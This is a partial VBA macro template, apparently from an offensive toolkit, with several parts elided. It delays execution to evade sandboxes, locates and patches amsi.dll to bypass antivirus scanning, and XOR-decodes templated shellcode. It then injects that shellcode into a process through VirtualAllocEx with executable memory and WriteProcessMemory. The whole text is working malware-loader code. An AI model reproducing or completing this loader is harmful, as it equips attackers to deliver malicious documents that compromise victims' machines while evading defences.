...
Function mymacro()
    ...
    ' XOR key for shellcode deobfuscation (customize as needed)
    xorKey = &H{{ .XorKeyInHex }}  ' example key: 0xAA
    ...
    vOut = CInt(subtime)
    If subtime < 3.5 Then Exit Function

    StrFile = Dir("c:\windows\system32\a?s?.d*")
    Is64 = arch()
    check = amcheck(StrFile, Is64)
    If check Then patch StrFile, Is64

    ' Load and deobfuscate shellcode into buf
    If Is64 Then
        {{ .Buf64 }}
    Else
        {{ .Buf32 }}
    ...
    ' XOR-decode the shellcode before injection
    For i = LBound(buf) To UBound(buf)
        buf(i) = buf(i) Xor xorKey
    Next i

    ' Proceed with standard injection flow
    If Is64 Then
    ...
    addr = VirtualAllocEx(Handle, 0, UBound(buf) + 1, &H3000, &H40)
    For i = LBound(buf) To UBound(buf)
        WriteProcessMemory Handle, addr + i, buf(i), 1, 0&
    Next i
